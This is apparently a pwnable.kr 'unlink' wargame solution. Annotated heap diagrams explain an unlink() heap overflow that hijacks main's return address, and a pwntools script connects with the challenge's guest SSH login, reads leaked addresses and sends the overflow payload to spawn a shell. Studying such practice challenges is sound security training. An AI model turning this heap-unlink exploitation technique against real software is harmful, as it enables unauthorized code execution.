'''
Summary: heap overflow to change the return address of main() to shell()

[Analyze unlink()]
OBJ->fb = OBJ
OBJ->bk = OBJ+4

[B->bk]->fd = B->fd
[B->fd]->bk = B->bk

actually, fd and bk are two pointers, so that we can use overflow to overwrite the target address.

[Stack Structure]
From the decompilers of IDA (F5), we can know that
v4 = (char *)malloc(0x10u);
v6 = malloc(0x10u);
v5 = malloc(0x10u);

Or from the assembly code
.text:0804855D                 mov     [ebp+var_14], eax
.text:0804856D                 mov     [ebp+var_C], eax
.text:0804857D                 mov     [ebp+var_10], eax

So, in the stack, the order is 
+---+ <- ebp - 0x14(stack addr)
| A |
+---+ <- ebp - 0x10
| C |
+---+ <- ebp - 0xC
| B |
+---+

[Heap Structure]
fd 4bytes; bk 4bytes; buf 8bytes

+-----------+-----------+
| prev_size | sizeof(A) |
+-----------+-----------+ <-- A(head addr)
|   fd(B)   |    bk     |
+-----------+-----------+ <-- A->buf = A + 8
|          buff         |
+-----------+-----------+
| prev_size | sizeof(B) |
+-----------+-----------+ <-- B = A + 24
|   fd(C)   |   bk(A)   |
+-----------+-----------+ <-- B->buf = A + 32
|          buff         | 
+-----------+-----------+ 
| prev_size | sizeof(C) |
+-----------+-----------+ <-- C = A + 48
|    fd     |   bk(B)   |
+-----------+-----------+ <-- C->buf = A + 56
|          buff         |
+-----------+-----------+ 

We want to overflow the heap to overwrite the value of eip to the address of shell.
Because of retn (= pop eip) at the end of main, it will modify the eip using the value of esp, so we just need to try to control esp.

080485FF                 mov     ecx, [ebp-4]
08048603                 lea     esp, [ecx-4]

ecx = ebp-4 = A+0x10
esp = ecx-4

let shellcode+4 = ebp-4, so that esp=shellcode

overwrite the two pointer fd & bk

check the ulink formula in ./unlink.mthml

+-----------+-----------+
| prev_size | sizeof(A) |
+-----------+-----------+ <-- A
|   fd(B)   |    bk     |
+-----------+-----------+ <-- A->buf = A + 8 = shellcode addr value(0x080484EB) = &A + 0x10 - 4
|0x080484EB |   AAAA    |
+-----------+-----------+ <-- A + 16
|   AAAA    |   AAAA    |
+-----------+-----------+ <-- B = A + 24
|   A+12    |  &A+0x10  |
+-----------+-----------+ <-- B->buf = A + 32
|          buff         | 
+-----------+-----------+ 
| prev_size | sizeof(C) |
+-----------+-----------+ <-- C = A + 48
|    fd     |   bk(B)   |
+-----------+-----------+ <-- C->buf = A + 56
|          buff         |
+-----------+-----------+ 
'''



from pwn import *

shellcode_addr = 0x080484eb

conn = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
p = conn.process("./unlink")

p.recvuntil("stack address leak: ")
stack_addr = int(p.recv(10), 16)
p.recvuntil("heap address leak: ")
heap_addr = int(p.recv(10), 16)

payload = p32(shellcode_addr) + 'a'*12 + p32(heap_addr + 12) + p32(stack_addr + 16)

p.send(payload)
p.interactive()
